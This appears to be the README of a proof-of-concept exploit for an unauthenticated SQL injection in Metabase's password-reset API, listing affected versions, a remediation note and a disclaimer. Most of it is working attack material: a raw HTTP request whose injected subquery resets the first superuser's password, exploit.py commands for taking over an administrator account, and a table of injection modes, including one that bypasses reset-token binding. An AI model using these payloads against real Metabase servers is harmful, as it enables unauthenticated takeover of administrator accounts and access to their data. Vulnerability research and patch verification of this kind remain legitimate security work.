# CVE-2026-72898 — Metabase Unauthenticated SQL Injection PoC

## Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2026-72898 |
| Vendor | Metabase |
| Component | `/api/session/reset_password` |
| Type | CWE-89 — SQL Injection |
| Auth required | No |
| CVSS | Critical |
| Reference | https://www.offsec.com/blog/cve-2026-72898-2/ |

## Affected Versions

| Branch | Vulnerable | Fixed |
|--------|-----------|-------|
| 0.58.x | < 0.58.24 | 0.58.24 |
| 0.59.x | < 0.59.21 | 0.59.21 |
| 0.60.x | < 0.60.17 | 0.60.17 |
| 0.61.x | < 0.61.11 | 0.61.11 |
| 0.62.x | < 0.62.9  | 0.62.9  |
| 0.63.x | < 0.63.5  | 0.63.5  |

## Root Cause

Metabase's Clojure backend passes the `user-id` field from the password-reset
request body directly into HoneySQL without stripping the `{:raw ...}` key:

```clojure
;; vulnerable pattern
(honey.sql/format {:where [:= :id user-id]})
```

When an attacker supplies `{"user-id": {"raw": "<SQL>"}}`, HoneySQL compiles
the value as a raw SQL literal instead of a bound parameter, resulting in a
full SQL injection at the application database layer.

## Attack Flow

```
1. POST /api/session/forgot_password  →  get a reset token for any known email
2. POST /api/session/reset_password   →  inject target user-id via HoneySQL raw
3. Server overwrites the target user's password_hash
4. Login as target user (admin/superuser)
```

No authentication is required at any step.

## Proof of Concept

### Minimal request

```http
POST /api/session/reset_password HTTP/1.1
Host: <target>:3000
Content-Type: application/json

{
  "token": "<valid-reset-token>",
  "user-id": {"raw": "(SELECT id FROM core_user WHERE is_superuser=true ORDER BY id LIMIT 1)"},
  "password": "<attacker-chosen-password>"
}
```

### exploit.py usage

```bash
# Step 1 — trigger reset email (get a token for an email you control)
python3 exploit.py --url http://<target>:3000 --email attacker@you.com

# Step 2 — use token to reset first superuser's password
python3 exploit.py --url http://<target>:3000 \
    --email attacker@you.com \
    --token <token-from-email> \
    --mode superuser \
    --new-pass 'NewPass@1234!' \
    --admin-email admin@target.com
```

### Injection modes

| Flag | Payload | Use case |
|------|---------|----------|
| `--mode superuser` | Subquery for first superuser | Admin UID unknown (default) |
| `--mode uid --uid N` | Integer literal N | Target UID known |
| `--mode bypass` | CASE/WHEN token-aware subquery | Token bound to specific user |

## Remediation

Upgrade to the fixed release for your branch (see table above).

Metabase fixed the issue by validating that `user-id` is a plain integer
before passing it to the query builder, rejecting any map/object input.

## Legal

This PoC is provided for **authorized security testing and educational
purposes only**. Use only on systems you own or have explicit written
permission to test. The author is not responsible for misuse.
